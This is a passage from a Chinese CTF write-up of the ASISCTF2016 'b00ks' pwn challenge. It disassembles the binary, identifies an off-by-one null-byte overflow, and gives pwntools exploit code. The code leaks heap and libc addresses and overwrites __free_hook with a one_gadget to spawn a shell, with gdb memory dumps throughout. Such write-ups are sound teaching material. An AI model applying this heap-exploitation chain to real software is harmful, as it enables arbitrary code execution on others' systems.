| |||||| 0x00001154 mov qword [rax + 0x10], rdx
; book->description = [ptr]
| |||||| 0x00001158 mov rax, qword [local_18h]
| |||||| 0x0000115c mov rdx, qword [fildes]
| |||||| 0x00001160 mov qword [rax + 8], rdx
; book->name = [fildes]
| |||||| 0x00001164 lea rax, [0x00202024]
| |||||| 0x0000116b mov eax, dword [rax]
; 取出 book_num
| |||||| 0x0000116d lea edx, [rax + 1]
; edx = book_num + 1
| |||||| 0x00001170 lea rax, [0x00202024]
| |||||| 0x00001177 mov dword [rax], edx
; 放回新的 book_num
| |||||| 0x00001179 lea rax, [0x00202024]
| |||||| 0x00001180 mov edx, dword [rax]
| |||||| 0x00001182 mov rax, qword [local_18h]
| |||||| 0x00001186 mov dword [rax], edx
; book->id = book_num
| |||||| 0x00001188 mov eax, 0
| ||||||,= 0x0000118f cmp qword [fildes], 0
; 释放掉一些指针
| ,== 0x000011a2 cmp qword [ptr], 0
| ,== 0x000011b5 cmp qword [local_18h], 0
| ,== 0x000011c8 mov eax, 1
| | ; CODE XREF from sub.Enter_book_name_size:_f55 (0x11
8d)
| `-> 0x000011cd leave
\ 0x000011ce ret
[0x000008e0]> px 8 @ 0x00202010
- offset - 0 1 2 3 4 5 6 7 8 9 A B C D E F 0123456789A
BCDEF
0x00202010 6020 2000 0000 0000 ` .....
Create 过程是首先在堆上为 name 分配空间，然后为 description 分配空间，最后
为 book 结构体分配空间。其中 name 和 description 的大小是由输入控制的，book
结构体则固定为 0x20 字节。
通过分析可以得到下面的数据结构：
1399
6.1.28 pwn ASISCTF2016 b00ks
struct book {
int id;
char *name;
char *description;
char description_size;
} book;
struct book *books[20];
其中 books 数组的起始地址为 0x00202060 。
漏洞利用
现在我们已经知道漏洞点是在读入 author name 的时候存在一个 off-by-one 漏洞。
另外由于 author name 和 books 之间距离正好为 0x00202060 - 0x00202040 =
0x20 ，并且 books 是在 author name 之后创建，所以如果 author name 恰好为
0x20 个字节，那么在 Print 的时候存在信息泄露。接下来如果对 author name 进行
修改，且仍然为 0x20 字节，则溢出的一个空字节将覆盖掉 books[0] 的低位字节。
思路如下：
1. 创建两个 book，其中要使第二个 book 的 name 和 description 通过 mmap 分
配（请求一块很大的空间），这是因为 mmap 分配的空间与 libc 基址存在固定
关系，后续将通过泄露这些地址得到 libc 基址。
2. 通过 Print，利用信息泄露漏洞得到 book1 在 heap 上的地址，从而计算得到
book2 的地址。
3. 通过 Edit 在 book1->description 中创建一个 fake book，其 fake->description
指向 book2->name。
4. 通过 Change author name 造成空字节溢出，使 books[0] 指向伪造的 fake
book。
5. 再次通过 Print 即可打印出 book2->name，这是一个通过 mmap 得到的指针，
于是计算出 libc 基址。
6. 先 Edit 操作 fake book，将 book2->description 修改为 free_hook 的地址，然
后 Edit 操作 book2，即可将 free_hook 修改为 one_gadget。
7. 此时 Delete book2，即可执行 one_gadget 获得 shell。
1400
6.1.28 pwn ASISCTF2016 b00ks
leak_heap
def leak_heap():
global book2_addr
io.sendlineafter("name: ", "A" * 0x20)
Create(0xd0, "AAAA", 0x20, "AAAA") # book1
Create(0x21000, "AAAA", 0x21000, "AAAA") # book2
Print()
io.recvuntil("A"*0x20)
book1_addr = u64(io.recvn(6).ljust(8, "\x00"))
book2_addr = book1_addr + 0x30
log.info("book2 address: 0x%x" % book2_addr)
创建两个 book，此时内存布局如下：
1401
6.1.28 pwn ASISCTF2016 b00ks
gdb-peda$ x/8gx 0x555555756040
0x555555756040: 0x4141414141414141 0x4141414141414141 name
0x555555758020: 0x0000000041414141 0x0000000000000000
0x555555758030: 0x0000000000000000 0x0000000000000000
0x555555758040: 0x0000000000000000 0x0000000000000000
0x555555758050: 0x0000000000000000 0x0000000000000000
0x555555758060: 0x0000000000000000 0x0000000000000000
0x555555758070: 0x0000000000000000 0x0000000000000000
0x555555758080: 0x0000000000000000 0x0000000000000000
0x555555758090: 0x0000000000000000 0x0000000000000000
0x5555557580a0: 0x0000000000000000 0x0000000000000000
0x5555557580b0: 0x0000000000000000 0x0000000000000000
0x5555557580c0: 0x0000000000000000 0x0000000000000000
0x5555557580d0: 0x0000000000000000 0x0000000000000000
0x5555557580e0: 0x0000000000000000 0x0000000000000000
0x5555557580f0: 0x0000000000000000 0x0000000000000031 description
0x555555758100: 0x0000000041414141 0x0000000000000000
0x555555758110: 0x0000000000000000 0x0000000000000000
0x555555758120: 0x0000000000000000 0x0000000000000031 description
0x555555758120: 0x0000000000000000 0x0000000000000031 name
0x555555758170: 0x00007ffff7fb0010 0x0000000000021000
0x555555758180: 0x0000000000000000 0x0000000000020e81
0x555555758190: 0x0000000000000000 0x0000000000000000
1405
6.1.28 pwn ASISCTF2016 b00ks
接下来先是伪造 fake book，然后通过空字节溢出，修改了 books[0] 的低位字节，
此时它指向了 fake book。而 fake->description 指向了 book2->name。
通过 Print 即可打印出 book2->name，进而计算出 libc 基址。
overwrite
def overwrite():
free_hook = libc.symbols['__free_hook'] + libc_base
one_gadget = libc_base + 0x4526a
fake_book = p64(free_hook) * 2
Edit(1, fake_book)
fake_book = p64(one_gadget)
Edit(2, fake_book)
依次修改 fake book 和 book2，最终将 __free_hook 修改为 one_gadget：
gdb-peda$ x/50gx 0x0000555555758020-0x10
0x555555758010: 0x0000000000000000 0x00000000000000e1
0x555555758020: 0x0000000041414141 0x0000000000000000
0x555555758030: 0x0000000000000000 0x0000000000000000
0x555555758040: 0x0000000000000000 0x0000000000000000
0x555555758050: 0x0000000000000000 0x0000000000000000
0x555555758060: 0x0000000000000000 0x0000000000000000
0x555555758070: 0x0000000000000000 0x0000000000000000
0x555555758080: 0x0000000000000000 0x0000000000000000
0x555555758090: 0x0000000000000000 0x0000000000000000
0x5555557580a0: 0x0000000000000000 0x0000000000000000
0x5555557580b0: 0x0000000000000000 0x0000000000000000
0x5555557580c0: 0x0000000000000000 0x0000000000000000
0x5555557580d0: 0x0000000000000000 0x0000000000000000
0x5555557580e0: 0x0000000000000000 0x0000000000000000
0x5555557580f0: 0x0000000000000000 0x0000000000000031
0x555555758100: 0x0000000000000001 0x0000555555758168
0x555555758110: 0x0000555555758168 0x0000000000000020 description
0x555555758120: 0x0000000000000000 0x0000000000000031
1406
6.1.28 pwn ASISCTF2016 b00ks
0x555555758130: 0x0000000000000001 0x0000555555758020
0x555555758140: 0x0000555555758100 0x0000000000000020
0x555555758150: 0x0000000000000000 0x0000000000000031
0x555555758160: 0x0000000000000002 0x00007ffff7dd37a8
0x555555758170: 0x00007ffff7dd37a8 0x0000000000021000 description
0x555555758180: 0x0000000000000000 0x0000000000020e81
0x555555758190: 0x0000000000000000 0x0000000000000000
gdb-peda$ x/gx 0x00007ffff7dd37a8
0x7ffff7dd37a8 : 0x00007ffff7a5226a
gdb-peda$ pdisass 0x00007ffff7a5226a /7
0x7ffff7a5226a: mov rax,QWORD PTR [rip+0x37ec47]
# 0x7ffff7dd0eb8
0x7ffff7a52271: lea rdi,[rip+0x147adf] # 0x7ffff
7b99d57
0x7ffff7a52278: lea rsi,[rsp+0x30]
0x7ffff7a5227d: mov DWORD PTR [rip+0x381219],0x0
# 0x7ffff7dd34a0
0x7ffff7a52287: mov DWORD PTR [rip+0x381213],0x0
# 0x7ffff7dd34a4
0x7ffff7a52291: mov rdx,QWORD PTR [rax]
0x7ffff7a52294: call 0x7ffff7ad9770 
pwn
def pwn():
Delete(2)
io.interactive()
最后 Delete book2，获得 shell。
开启 ASLR，Bingo!!!
1407